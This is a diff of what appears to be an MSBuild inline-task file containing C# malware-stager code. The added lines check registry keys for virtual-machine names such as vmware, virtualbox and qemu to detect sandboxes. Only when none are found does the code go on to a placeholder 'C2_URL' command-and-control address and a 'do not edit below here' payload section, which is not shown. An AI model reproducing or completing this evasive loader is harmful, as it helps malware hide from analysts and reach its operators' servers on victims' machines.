@@ -15,13 +15,16 @@
       <Using Namespace="System.Reflection" />
       <Using Namespace="System.IO" />
       <Using Namespace="System.IO.Compression" />
-	  <Using Namespace="System.Collections.Generic" />
-	  <Using Namespace="Microsoft.Win32" />
+      <Using Namespace="System.Collections.Generic" />
+      <Using Namespace="Microsoft.Win32" />
 
       <Code Type="Fragment" Language="cs">
         <![CDATA[
+		
+			//The code under is not finished. 
+			////////////// SANDBOX DETECTION /////////////////////
+			
 			List<string> EvidenceOfSandbox = new List<string>();
-
 			List<string> sandboxStrings = new List<string> {"vmware", "virtualbox", "vbox", "qemu", "xen"};
 
 			string[] Registry_check = {@"HARDWARE\DEVICEMAP\Scsi\Scsi Port 2\Scsi Bus 0\Target Id 0\Logical Unit Id 0\Identifier",
@@ -38,9 +41,10 @@
 					EvidenceOfSandbox.Add(@"HKLM:\" + Key_check);
 				}
 			}
-			if (EvidenceOfSandbox.Count != 0) {
-			} else {
-			
+			if (EvidenceOfSandbox.Count == 0) {
+
+			////////////// SANDBOX DETECTION (END) /////////////////////
+				
 				string url = "C2_URL";
 
 				// ----- DO NOT EDIT BELOW HERE -----
